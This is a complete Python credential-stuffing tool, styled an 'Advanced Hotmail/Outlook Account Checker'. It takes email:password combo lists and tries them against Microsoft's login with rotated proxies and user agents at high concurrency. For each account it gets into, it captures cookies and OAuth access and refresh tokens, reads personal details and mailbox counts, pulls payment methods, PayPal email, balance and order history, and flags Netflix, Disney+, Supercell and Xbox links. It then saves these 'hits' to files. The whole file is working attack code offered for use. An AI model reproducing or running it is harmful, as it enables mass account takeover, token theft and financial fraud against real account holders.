import asyncio
import httpx
import json
import re
import uuid
import random
import time
from typing import Optional, Dict, List, Tuple, Any
from urllib.parse import quote, unquote
from dataclasses import dataclass, asdict
from datetime import datetime
import sys
from pathlib import Path
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.panel import Panel
from rich import box

console = Console()


@dataclass
class AccountDetails:
    email: str
    password: str
    status: str
    name: Optional[str] = None
    country: Optional[str] = None
    birthdate: Optional[str] = None
    unread_messages: Optional[int] = None
    total_messages: Optional[int] = None
    inbox_count: Optional[int] = None
    draft_count: Optional[int] = None
    sent_count: Optional[int] = None
    deleted_count: Optional[int] = None
    two_factor: bool = False
    cookies: Optional[Dict] = None
    tokens: Optional[Dict] = None
    oauth_token: Optional[str] = None
    refresh_token: Optional[str] = None
    access_token: Optional[str] = None
    payment_balance: Optional[str] = None
    payment_methods: Optional[List[str]] = None
    paypal_email: Optional[str] = None
    total_orders: Optional[int] = None
    xbox_linked: bool = False
    netflix_subscription: bool = False
    disney_subscription: bool = False
    supercell_linked: bool = False
    subscriptions: Optional[List[str]] = None
    client_id: Optional[str] = None
    canary: Optional[str] = None
    timestamp: Optional[str] = None
    error_message: Optional[str] = None

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")


class AdvancedHotmailChecker:
    def __init__(self, proxies: Optional[List[str]] = None, timeout: int = 30, max_retries: int = 2):
        self.proxies = proxies or []
        self.timeout = timeout
        self.max_retries = max_retries
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        ]
        self.stats = {
            "total": 0,
            "success": 0,
            "failure": 0,
            "two_factor": 0,
            "error": 0,
            "invalid_email": 0,
            "invalid_password": 0,
            "timeout": 0,
            "start_time": time.time()
        }
        self.success_results = []
        self.two_factor_results = []
        self.failed_results = []

    def get_random_ua(self) -> str:
        return random.choice(self.user_agents)

    def get_proxy(self) -> Optional[str]:
        if not self.proxies:
            return None
        return random.choice(self.proxies)

    async def check_account(self, email: str, password: str) -> AccountDetails:
        self.stats["total"] += 1
        
        for attempt in range(self.max_retries):
            try:
                proxy = self.get_proxy()
                ua = self.get_random_ua()
                
                async with httpx.AsyncClient(
                    timeout=self.timeout,
                    proxy=proxy,
                    follow_redirects=True,
                    verify=False
                ) as client:
                    result = await self._perform_advanced_login(client, email, password, ua)
                    
                    if result.status == "SUCCESS":
                        self.stats["success"] += 1
                        await self._capture_full_account_info(client, result, ua)
                        self.success_results.append(result)
                    elif result.status == "2FACTOR":
                        self.stats["two_factor"] += 1
                        self.two_factor_results.append(result)
                    elif result.status == "INVALID_EMAIL":
                        self.stats["invalid_email"] += 1
                        self.failed_results.append(result)
                    elif result.status == "INVALID_PASSWORD":
                        self.stats["invalid_password"] += 1
                        self.failed_results.append(result)
                    elif result.status == "TIMEOUT":
                        self.stats["timeout"] += 1
                        if attempt < self.max_retries - 1:
                            await asyncio.sleep(1)
                            continue
                    else:
                        self.stats["failure"] += 1
                        self.failed_results.append(result)
                    
                    return result
                    
            except httpx.TimeoutException:
                if attempt < self.max_retries - 1:
                    await asyncio.sleep(1)
                    continue
                self.stats["timeout"] += 1
                return AccountDetails(
                    email=email,
                    password=password,
                    status="TIMEOUT",
                    error_message="Connection timeout"
                )
            except Exception as e:
                if attempt < self.max_retries - 1:
                    await asyncio.sleep(1)
                    continue
                self.stats["error"] += 1
                return AccountDetails(
                    email=email,
                    password=password,
                    status="ERROR",
                    error_message=str(e)
                )
        
        return AccountDetails(
            email=email,
            password=password,
            status="ERROR",
            error_message="Max retries exceeded"
        )

    async def _perform_advanced_login(self, client: httpx.AsyncClient, email: str, password: str, ua: str) -> AccountDetails:
        try:
            client_id = str(uuid.uuid4())
            uaid = str(uuid.uuid4()).replace("-", "")
            ct_timestamp = int(time.time())
            
            initial_response = await client.get(
                "https://login.live.com/login.srf",
                params={
                    "wa": "wsignin1.0",
                    "rpsnv": "152",
                    "ct": ct_timestamp,
                    "rver": "7.0.6738.0",
                    "wp": "MBI_SSL",
                    "wreply": "https://outlook.live.com/owa/?nlp=1",
                    "id": "292841",
                    "aadredir": "1",
                    "CBCXT": "out",
                    "lw": "1",
                    "fl": "dob,flname,wld",
                    "cobrandid": "90015"
                },
                headers={
                    "User-Agent": ua,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Referer": "https://login.live.com/"
                },
                follow_redirects=False
            )

            if initial_response.status_code in [301, 302, 307, 308]:
                await client.get(initial_response.headers["location"], follow_redirects=True)
                initial_response = await client.get(
                    "https://login.live.com/login.srf",
                    params={
                        "wa": "wsignin1.0",
                        "rpsnv": "152",
                        "ct": ct_timestamp,
                        "rver": "7.0.6738.0",
                        "wp": "MBI_SSL",
                        "wreply": "https://outlook.live.com/owa/?nlp=1",
                        "id": "292841",
                        "aadredir": "1",
                        "CBCXT": "out",
                        "lw": "1",
                        "fl": "dob,flname,wld",
                        "cobrandid": "90015"
                    },
                    headers={
                        "User-Agent": ua,
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "Referer": "https://login.live.com/"
                    }
                )
            
            opid = self._extract_value(initial_response.text, r'opid=([^&\'\"]+)')
            uaid_from_page = self._extract_value(initial_response.text, r'uaid=([^&\'\"]+)')
            if uaid_from_page:
                uaid = uaid_from_page
                
            flow_token = self._extract_value(
                initial_response.text, 
                r'"sFTTag"\s*:\s*"<input[^>]*value=\\"([^"\\]+)\\"',
                r'sFTTag[\'"]?\s*:\s*[\'"]<input[^>]*value=["\']([^"\']+)["\']',
                r'name="PPFT"[^>]*value="([^"]+)"',
                r'"sFT"\s*:\s*"([^"]+)"',
                r'id="i0327"\s+value="([^"]+)"'
            )
            
            if not flow_token:
                return AccountDetails(email=email, password=password, status="ERROR", error_message="Failed to extract flow token")

            contextid = self._extract_value(initial_response.text, r'contextid=([^&\'\"]+)')

            cred_check_url = "https://login.live.com/GetCredentialType.srf"
            if opid:
                cred_check_url += f"?opid={opid}"
                if uaid:
                    cred_check_url += f"&uaid={uaid}"

            cred_response = await client.post(
                cred_check_url,
                json={
                    "username": email,
                    "uaid": uaid,
                    "isOtherIdpSupported": True,
                    "checkPhones": False,
                    "isRemoteNGCSupported": True,
                    "isCookieBannerShown": False,
                    "isFidoSupported": True,
                    "forceotclogin": False,
                    "otclogindisallowed": False,
                    "isExternalFederationDisallowed": False,
                    "isRemoteConnectSupported": False,
                    "federationFlags": 3,
                    "isSignup": False,
                    "flowToken": flow_token,
                    "originalRequest": "",
                    "country": ""
                },
                headers={
                    "User-Agent": ua,
                    "Content-Type": "application/json; charset=UTF-8",
                    "Accept": "application/json",
                    "Origin": "https://login.live.com",
                    "Referer": str(initial_response.url),
                    "client-request-id": uaid,
                    "hpgid": "33",
                    "hpgact": "0"
                }
            )

            cred_data = cred_response.json()
            
            if cred_data.get("IfExistsResult") == 1:
                return AccountDetails(email=email, password=password, status="INVALID_EMAIL", error_message="Account doesn't exist")
            
            credentials = cred_data.get("Credentials", {})
            has_password = credentials.get("HasPassword", 0) or credentials.get("PrefCredential", 0)
            
            if not has_password:
                return AccountDetails(email=email, password=password, status="INVALID_EMAIL", error_message="Account has no password")

            post_url = f"https://login.live.com/ppsecure/post.srf"
            if contextid and opid:
                post_url += f"?cobrandid=90015&id=292841&contextid={contextid}&opid={opid}&bk={int(time.time())}"
                if uaid:
                    post_url += f"&uaid={uaid}"

            login_response = await client.post(
                post_url,
                data={
                    "ps": "2",
                    "psRNGCDefaultType": "",
                    "psRNGCEntropy": "",
                    "psRNGCSLK": "",
                    "canary": "",
                    "ctx": "",
                    "hpgrequestid": "",
                    "PPFT": flow_token,
                    "PPSX": "Passport",
                    "NewUser": "1",
                    "FoundMSAs": "",
                    "fspost": "0",
                    "i21": "0",
                    "CookieDisclosure": "0",
                    "IsFidoSupported": "1",
                    "isSignupPost": "0",
                    "isRecoveryAttemptPost": "0",
                    "i13": "0",
                    "login": email,
                    "loginfmt": email,
                    "type": "11",
                    "LoginOptions": "3",
                    "lrt": "",
                    "lrtPartition": "",
                    "hisRegion": "",
                    "hisScaleUnit": "",
                    "passwd": password,
                    "i19": str(random.randint(1000, 99999))
                },
                headers={
                    "User-Agent": ua,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Origin": "https://login.live.com",
                    "Referer": str(initial_response.url),
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1"
                }
            )

            login_text = login_response.text.lower()
            
            if "account or password is incorrect" in login_text or "incorrect" in login_text or "votre compte ou mot de passe est incorrect" in login_text:
                return AccountDetails(email=email, password=password, status="INVALID_PASSWORD", error_message="Wrong password")
            
            if any(keyword in login_text for keyword in ["recover", "abuse", "cancel", "/identity/confirm", "twoway", "verify", "twowayvoi"]):
                return AccountDetails(email=email, password=password, status="2FACTOR", two_factor=True, error_message="Two-factor authentication required")
            
            if "ssigninname" in login_text or "__host-msaauth" in str(login_response.cookies).lower() or "ppauth" in str(login_response.cookies).lower():
                cookies = dict(login_response.cookies)
                
                url_post_match = re.search(r'urlPost\s*:\s*[\'"]([^\'"]+)[\'"]', login_response.text)
                if url_post_match:
                    post_continuation_url = unquote(url_post_match.group(1))
                    
                    nap_exp = self._extract_value(login_response.text, r'name="NAPExp"\s+value="([^"]+)"')
                    wbids = self._extract_value(login_response.text, r'name="wbids"\s+value="([^"]+)"')
                    pprid = self._extract_value(login_response.text, r'name="pprid"\s+value="([^"]+)"')
                    wbid = self._extract_value(login_response.text, r'name="wbid"\s+value="([^"]+)"')
                    nap = self._extract_value(login_response.text, r'name="NAP"\s+value="([^"]+)"')
                    anon = self._extract_value(login_response.text, r'name="ANON"\s+value="([^"]+)"')
                    anon_exp = self._extract_value(login_response.text, r'name="ANONExp"\s+value="([^"]+)"')
                    t_token = self._extract_value(login_response.text, r'name="t"\s+value="([^"]+)"')
                    
                    if nap_exp or wbids:
                        await client.post(
                            post_continuation_url,
                            data={
                                "LoginOptions": "1",
                                "type": "28",
                                "ctx": "",
                                "hpgrequestid": "",
                                "PPFT": flow_token,
                                "i19": str(random.randint(1000, 9999))
                            },
                            headers={
                                "User-Agent": ua,
                                "Content-Type": "application/x-www-form-urlencoded",
                                "Origin": "https://login.live.com",
                                "Referer": str(login_response.url)
                            }
                        )
                
                return AccountDetails(
                    email=email,
                    password=password,
                    status="SUCCESS",
                    cookies=cookies,
                    client_id=client_id
                )

            return AccountDetails(email=email, password=password, status="UNKNOWN", error_message="Unknown login response")

        except httpx.TimeoutException:
            return AccountDetails(email=email, password=password, status="TIMEOUT", error_message="Request timeout")
        except Exception as e:
            return AccountDetails(email=email, password=password, status="ERROR", error_message=str(e))

    def _extract_value(self, text: str, *patterns: str) -> Optional[str]:
        for pattern in patterns:
            match = re.search(pattern, text)
            if match:
                return match.group(1)
        return None

    async def _capture_full_account_info(self, client: httpx.AsyncClient, result: AccountDetails, ua: str):
        try:
            outlook_response = await client.get(
                "https://outlook.live.com/owa/",
                headers={
                    "User-Agent": ua,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
                }
            )

            canary = outlook_response.cookies.get("X-OWA-CANARY", "")
            result.canary = canary
            
            mscv = self._extract_value(str(outlook_response.headers), r'MS-CV[\'"]?\s*:\s*[\'"]?([^\'"]+)')
            
            if canary:
                try:
                    session_id = str(uuid.uuid4())
                    startup_response = await client.post(
                        "https://outlook.live.com/owa/0/startupdata.ashx?app=Mail&n=0",
                        content=b"",
                        headers={
                            "User-Agent": ua,
                            "x-owa-canary": canary,
                            "x-owa-sessionid": session_id,
                            "x-req-source": "Mail",
                            "action": "StartupData",
                            "Accept": "*/*",
                            "Origin": "https://outlook.live.com",
                            "Referer": "https://outlook.live.com/",
                            "Content-Type": "application/x-www-form-urlencoded"
                        }
                    )

                    if startup_response.status_code == 200:
                        try:
                            data = startup_response.json()
                            result.name = data.get("UserDisplayName")
                            result.country = data.get("ConsumerUserCountry")
                            result.birthdate = data.get("BirthdayPrecision") or data.get("Birthday")
                            result.unread_messages = data.get("UnreadCount")
                            
                            if "MailFolders" in data:
                                folders = data.get("MailFolders", [])
                                total = 0
                                for folder in folders:
                                    folder_name = folder.get("DisplayName", "").lower()
                                    total_items = folder.get("TotalItemCount", 0)
                                    total += total_items
                                    
                                    if "inbox" in folder_name:
                                        result.inbox_count = total_items
                                    elif "draft" in folder_name:
                                        result.draft_count = total_items
                                    elif "sent" in folder_name:
                                        result.sent_count = total_items
                                    elif "deleted" in folder_name or "trash" in folder_name:
                                        result.deleted_count = total_items
                                
                                result.total_messages = total
                        except json.JSONDecodeError:
                            pass
                except Exception:
                    pass

            name_match = re.search(r'"UserDisplayName"\s*:\s*"([^"]+)"', outlook_response.text)
            if name_match and not result.name:
                result.name = name_match.group(1)

            await self._capture_oauth_tokens(client, result, ua)
            await self._capture_payment_info(client, result, ua)

        except Exception:
            pass

    async def _capture_oauth_tokens(self, client: httpx.AsyncClient, result: AccountDetails, ua: str):
        try:
            oauth_response = await client.get(
                "https://login.live.com/oauth20_authorize.srf",
                params={
                    "client_id": "0000000048170EF2",
                    "response_type": "token",
                    "scope": "service::outlook.office.com::MBI_SSL",
                    "redirect_uri": "https://login.live.com/oauth20_desktop.srf",
                    "display": "touch"
                },
                headers={
                    "User-Agent": ua,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
                }
            )

            refresh_token = self._extract_value(str(oauth_response.url), r'refresh_token=([^&]+)')
            access_token = self._extract_value(str(oauth_response.url), r'access_token=([^&]+)')
            
            if refresh_token:
                result.refresh_token = unquote(refresh_token)
            if access_token:
                result.access_token = unquote(access_token)

            if refresh_token:
                try:
                    token_response = await client.post(
                        "https://login.live.com/oauth20_token.srf",
                        data={
                            "grant_type": "refresh_token",
                            "client_id": "0000000048170EF2",
                            "scope": "https://substrate.office.com/User-Internal.ReadWrite",
                            "redirect_uri": "https://login.live.com/oauth20_desktop.srf",
                            "refresh_token": unquote(refresh_token),
                            "uaid": str(uuid.uuid4()).replace("-", "")
                        },
                        headers={
                            "User-Agent": ua,
                            "Content-Type": "application/x-www-form-urlencoded",
                            "x-ms-sso-Ignore-SSO": "1"
                        }
                    )

                    if token_response.status_code == 200:
                        token_data = token_response.json()
                        result.oauth_token = token_data.get("access_token")
                        
                        result.tokens = {
                            "access_token": token_data.get("access_token"),
                            "refresh_token": unquote(refresh_token),
                            "token_type": token_data.get("token_type"),
                            "expires_in": token_data.get("expires_in")
                        }
                except Exception:
                    pass

        except Exception:
            pass

    async def _capture_payment_info(self, client: httpx.AsyncClient, result: AccountDetails, ua: str):
        try:
            auth_response = await client.get(
                "https://login.live.com/oauth20_authorize.srf",
                params={
                    "client_id": "000000000004773A",
                    "response_type": "token",
                    "scope": "PIFD.Read PIFD.Create PIFD.Update PIFD.Delete",
                    "redirect_uri": "https://account.microsoft.com/auth/complete-silent-delegate-auth",
                    "prompt": "none"
                },
                headers={
                    "User-Agent": ua,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Referer": "https://account.microsoft.com/"
                }
            )

            payment_token = self._extract_value(str(auth_response.url), r'access_token=([^&]+)')
            
            if payment_token:
                payment_token = unquote(payment_token)
                
                try:
                    payment_response = await client.get(
                        "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx",
                        params={
                            "status": "active,removed",
                            "language": "en-US"
                        },
                        headers={
                            "User-Agent": ua,
                            "Accept": "application/json",
                            "Authorization": f'MSADELEGATE1.0="{payment_token}"',
                            "Content-Type": "application/json",
                            "Origin": "https://account.microsoft.com",
                            "Referer": "https://account.microsoft.com/"
                        }
                    )

                    if payment_response.status_code == 200:
                        payment_data = payment_response.json()
                        
                        result.payment_balance = self._extract_value(payment_response.text, r'"balance"\s*:\s*([0-9.]+)')
                        
                        payment_methods = []
                        for item in payment_data.get("paymentInstruments", []):
                            display_info = item.get("display", {})
                            method_name = display_info.get("name", "")
                            if method_name:
                                payment_methods.append(method_name)
                            
                            if item.get("paymentMethodFamily") == "paypal":
                                result.paypal_email = self._extract_value(str(item), r'"email"\s*:\s*"([^"]+)"')
                        
                        if payment_methods:
                            result.payment_methods = payment_methods

                    orders_response = await client.get(
                        "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
                        headers={
                            "User-Agent": ua,
                            "Accept": "application/json",
                            "Authorization": f'MSADELEGATE1.0="{payment_token}"',
                            "Content-Type": "application/json",
                            "Origin": "https://account.microsoft.com",
                            "Referer": "https://account.microsoft.com/"
                        }
                    )

                    if orders_response.status_code == 200:
                        orders_text = orders_response.text
                        order_count = orders_text.count('"orderId"')
                        if order_count > 0:
                            result.total_orders = order_count
                        
                        await self._detect_subscriptions(orders_text, result)

                except Exception:
                    pass
            
            await self._check_xbox_services(client, result, ua)

        except Exception:
            pass
    
    async def _detect_subscriptions(self, orders_text: str, result: AccountDetails):
        subscriptions = []
        orders_lower = orders_text.lower()
        
        if 'netflix' in orders_lower:
            result.netflix_subscription = True
            subscriptions.append('Netflix')
        
        if 'disney' in orders_lower or 'disney+' in orders_lower or 'disneyplus' in orders_lower:
            result.disney_subscription = True
            subscriptions.append('Disney+')
        
        if 'supercell' in orders_lower or 'clash of clans' in orders_lower or 'clash royale' in orders_lower or 'brawl stars' in orders_lower:
            result.supercell_linked = True
            subscriptions.append('Supercell')
        
        if result.paypal_email:
            subscriptions.append(f'PayPal ({result.paypal_email})')
        
        if subscriptions:
            result.subscriptions = subscriptions
    
    async def _check_xbox_services(self, client: httpx.AsyncClient, result: AccountDetails, ua: str):
        try:
            xbox_response = await client.get(
                "https://account.xbox.com/api/accountsettings",
                headers={
                    "User-Agent": ua,
                    "Accept": "application/json",
                    "Referer": "https://account.xbox.com/"
                }
            )
            
            if xbox_response.status_code == 200:
                xbox_data = xbox_response.text.lower()
                if 'gamertag' in xbox_data or 'xbox' in xbox_data or 'xuid' in xbox_data:
                    result.xbox_linked = True
                    if result.subscriptions:
                        result.subscriptions.append('Xbox Live')
                    else:
                        result.subscriptions = ['Xbox Live']
        except Exception:
            pass

    def get_stats(self) -> Dict[str, Any]:
        elapsed = time.time() - self.stats["start_time"]
        cpm = (self.stats["total"] / elapsed * 60) if elapsed > 0 else 0
        
        return {
            **self.stats,
            "elapsed": elapsed,
            "cpm": cpm,
            "success_rate": (self.stats["success"] / self.stats["total"] * 100) if self.stats["total"] > 0 else 0
        }


async def load_combos(filepath: str) -> List[Tuple[str, str]]:
    combos = []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        combos.append((parts[0].strip(), parts[1].strip()))
    except FileNotFoundError:
        console.print(f"[red]✗ File not found: {filepath}[/red]")
    return combos


async def load_proxies(filepath: str) -> List[str]:
    proxies = []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line:
                    if not line.startswith('http'):
                        line = f"http://{line}"
                    proxies.append(line)
    except FileNotFoundError:
        console.print(f"[yellow]⚠ Proxy file not found: {filepath}. Running without proxies.[/yellow]")
    return proxies


async def save_results(checker: AdvancedHotmailChecker, output_dir: str = "results"):
    Path(output_dir).mkdir(exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    if checker.success_results:
        with open(f"{output_dir}/hits_{timestamp}.txt", 'w', encoding='utf-8') as f:
            for result in checker.success_results:
                line = f"{result.email}:{result.password}"
                details = []
                if result.name:
                    details.append(f"Name={result.name}")
                if result.country:
                    details.append(f"Country={result.country}")
                if result.unread_messages is not None:
                    details.append(f"Unread={result.unread_messages}")
                if result.total_messages is not None:
                    details.append(f"Total={result.total_messages}")
                if result.payment_balance:
                    details.append(f"Balance=${result.payment_balance}")
                if result.payment_methods:
                    details.append(f"PaymentMethods={','.join(result.payment_methods)}")
                if result.total_orders:
                    details.append(f"Orders={result.total_orders}")
                
                if details:
                    line += f" | {' | '.join(details)}"
                f.write(line + "\n")
        
        with open(f"{output_dir}/full_capture_{timestamp}.json", 'w', encoding='utf-8') as f:
            json.dump([asdict(r) for r in checker.success_results], f, indent=2)

    if checker.two_factor_results:
        with open(f"{output_dir}/2fa_{timestamp}.txt", 'w', encoding='utf-8') as f:
            for result in checker.two_factor_results:
                f.write(f"{result.email}:{result.password}\n")

    with open(f"{output_dir}/stats_{timestamp}.json", 'w', encoding='utf-8') as f:
        json.dump(checker.get_stats(), f, indent=2)


async def main():
    console.print(Panel.fit(
        "[bold cyan]ADVANCED HOTMAIL/OUTLOOK ACCOUNT CHECKER[/bold cyan]\n"
        "[green]✓ Full Account Capture[/green] | [green]✓ Payment Info[/green] | [green]✓ OAuth Tokens[/green]\n"
        "[green]✓ Fast & Accurate[/green] | [green]✓ Multi-threaded[/green] | [green]✓ Retry Logic[/green]",
        box=box.DOUBLE,
        border_style="cyan"
    ))

    combo_file = console.input("[cyan]Enter combo file path (email:pass)[/cyan] [dim][combos.txt][/dim]: ").strip() or "combos.txt"
    proxy_file = console.input("[cyan]Enter proxy file path (optional)[/cyan] [dim][proxies.txt][/dim]: ").strip() or "proxies.txt"
    threads = int(console.input("[cyan]Enter concurrent threads[/cyan] [dim][50][/dim]: ").strip() or "50")
    timeout = int(console.input("[cyan]Enter timeout in seconds[/cyan] [dim][30][/dim]: ").strip() or "30")

    console.print("\n[yellow]⏳ Loading combos...[/yellow]")
    combos = await load_combos(combo_file)
    
    if not combos:
        console.print("[red]✗ No valid combos loaded. Exiting.[/red]")
        return

    console.print(f"[green]✓ Loaded {len(combos)} combos[/green]")

    console.print("[yellow]⏳ Loading proxies...[/yellow]")
    proxies = await load_proxies(proxy_file)
    
    if proxies:
        console.print(f"[green]✓ Loaded {len(proxies)} proxies[/green]")
    else:
        console.print("[yellow]⚠ Running without proxies[/yellow]")

    checker = AdvancedHotmailChecker(proxies=proxies, timeout=timeout, max_retries=2)

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("({task.completed}/{task.total})"),
        console=console
    ) as progress:
        task = progress.add_task("[cyan]Checking accounts...", total=len(combos))

        semaphore = asyncio.Semaphore(threads)

        async def check_with_semaphore(email: str, password: str):
            async with semaphore:
                result = await checker.check_account(email, password)
                
                if result.status == "SUCCESS":
                    details = f" | {result.name or 'N/A'}"
                    if result.payment_balance:
                        details += f" | ${result.payment_balance}"
                    console.print(f"[green]✓ SUCCESS[/green] {email}{details}")
                elif result.status == "2FACTOR":
                    console.print(f"[yellow]⚠ 2FA[/yellow] {email}")
                elif result.status == "INVALID_PASSWORD":
                    console.print(f"[red]✗ WRONG PASS[/red] {email}")
                
                progress.advance(task)

        tasks = [check_with_semaphore(email, password) for email, password in combos]
        await asyncio.gather(*tasks)

    stats = checker.get_stats()
    
    table = Table(title="Final Statistics", box=box.ROUNDED, border_style="cyan")
    table.add_column("Metric", style="cyan", no_wrap=True)
    table.add_column("Value", style="magenta")
    
    table.add_row("Total Checked", str(stats["total"]))
    table.add_row("✓ Success", f"[green]{stats['success']}[/green]")
    table.add_row("⚠ 2FA Required", f"[yellow]{stats['two_factor']}[/yellow]")
    table.add_row("✗ Invalid Email", f"[red]{stats['invalid_email']}[/red]")
    table.add_row("✗ Invalid Password", f"[red]{stats['invalid_password']}[/red]")
    table.add_row("⏱ Timeout", f"[blue]{stats['timeout']}[/blue]")
    table.add_row("⚠ Errors", f"[red]{stats['error']}[/red]")
    table.add_row("Success Rate", f"{stats['success_rate']:.2f}%")
    table.add_row("Elapsed Time", f"{stats['elapsed']:.2f}s")
    table.add_row("CPM", f"{stats['cpm']:.2f}")
    
    console.print(table)

    console.print("\n[yellow]⏳ Saving results...[/yellow]")
    await save_results(checker)
    console.print("[green]✓ Results saved to 'results' folder![/green]\n")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[red]✗ Program interrupted by user.[/red]")
        sys.exit(0)
